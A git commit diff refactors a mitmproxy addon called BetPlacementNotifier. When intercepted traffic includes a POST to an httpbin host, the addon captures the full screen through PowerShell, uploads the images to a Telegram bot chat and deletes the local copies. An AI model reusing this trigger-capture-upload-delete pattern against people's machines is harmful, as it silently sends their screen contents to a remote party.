5ee59fa947beac07433a015e59a5de5501861d1b
danylo <danylo.maryskevych@gmail.com>
2024-10-06 16:34:27 +0300

    remove utils

--- src/mitmproxy/addon.py
+++ src/mitmproxy/addon.py
@@ -1,12 +1,11 @@
+import subprocess
+import datetime
 import logging
 import asyncio
 import httpx
-import subprocess
-import datetime
 import time
 import uuid
 import os
-from utils import take_screenshot
 
 class BetPlacementNotifier:
 
@@ -20,61 +19,78 @@ class BetPlacementNotifier:
     def __init__(self):
         self.num = 0
 
-    # This method simulates the flow and triggers the screenshot based on the passed parameter
     async def response(self, flow):
-        # Example check for request
+        # if flow.request.host == "httpbin.org" and flow.request.path == "/ip" and flow.request.method == "GET":
         if 'httpbin' in flow.request.host and flow.request.method == "POST":
-            asyncio.create_task(self.generate_screenshot())
+            asyncio.create_task(self.send_screenshots())
 
-    async def generate_screenshot(self):
-
-        screenshots = []
-
-        for i in range(self.SCREENSHOT_COUNT):
-            output_file = await take_screenshot(i)  # Take a screenshot and get the output file path
-            screenshots.append(output_file)
-
-            # Wait for 1 second before taking the next screenshot
-            await asyncio.sleep(self.SCREENSHOT_DELAY)
-
-        # Send the screenshot to Telegram
-        await self.send_screenshots(screenshots)
-
-    async def send_screenshots(self, file_paths):
-        # Open the file in binary mode
+    async def send_screenshots(self):
         batch_uuid = '#' + str(uuid.uuid4()).replace('-', '_')
 
-        for index, file_path in enumerate(file_paths):
-            with open(file_path, 'rb') as file:
-                url = f"https://api.telegram.org/bot{self.TELEGRAM_BOT_TOKEN}/sendPhoto"
-                tmp_batch_uuid = batch_uuid + f"\nImage {index + 1}"
-                payload = {
-                    'chat_id': self.CHAT_ID,
-                    'caption': tmp_batch_uuid
-                }
-                files = {
-                    'photo': file
-                }
+        for i in range(self.SCREENSHOT_COUNT):
+            output_file = await self.take_screenshot(i)
+            tmp_batch_uuid = batch_uuid + f"\nImage {i + 1}"
+            await self.send_photo_to_telegram(self.TELEGRAM_BOT_TOKEN, self.CHAT_ID,  output_file, tmp_batch_uuid)
+            await self.remove_file(output_file)
 
-                async with httpx.AsyncClient() as client:
-                    try:
-                        response = await client.post(url, data=payload, files=files)
-                        if response.status_code == 200:
-                            logging.info(f"Screenshots sent to Telegram successfully.")
 
-                    except Exception as e:
-                        logging.error(f"Error sending screenshot: {e}")
 
-        await self.remove_files(file_paths)
+        # ***** Utils *****
+    async def take_screenshot(self, index):
+        # Generate a timestamped filename
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"C:\\screenshot_{timestamp}_{index}.png"
 
-    async def remove_files(self, file_paths):
-       for file_path in file_paths:
+        # PowerShell command to take a screenshot
+        powershell_command = f"""
+        param (
+            [string]$outputFile = "{output_file}"
+        )
+
+        Add-Type -AssemblyName System.Windows.Forms
+        $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
+        $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+        $bmp = New-Object Drawing.Bitmap($width, $height)
+        $g = [Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
+        $g.Dispose()
+        $bmp.Save($outputFile)
+        $bmp.Dispose()
+        """
+
+        # Run the PowerShell command to take the screenshot
+        subprocess.run(["powershell", "-Command", powershell_command])
+        logging.info(f"Screenshot saved at: {output_file}")
+
+        return output_file
+
+    async def send_photo_to_telegram(self, bot_token, chat_id, photo_path, caption):
+        url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
+
+        with open(photo_path, 'rb') as photo_file:
+            payload = {
+                'chat_id': chat_id,
+                'caption': caption
+            }
+            files = {
+                'photo': photo_file
+            }
+
+            async with httpx.AsyncClient() as client:
+                try:
+                    response = await client.post(url, data=payload, files=files)
+                    response.raise_for_status()  # Raise an error for bad responses
+                    logging.info(f"Screenshots sent to Telegram successfully.")
+                except httpx.HTTPStatusError as e:
+                    logging.error(f"Error sending photo to Telegram: {e.response.status_code} - {e.response.text}")
+                except Exception as e:
+                    logging.error(f"Error sending photo to Telegram: {e}")
+
+    async def remove_file(self, file_path):
         try:
             if os.path.exists(file_path):
                 os.remove(file_path)
         except Exception as e:
             logging.error(f"Error removing file {file_path}: {e}")
-
-
 
 addons = [BetPlacementNotifier()]
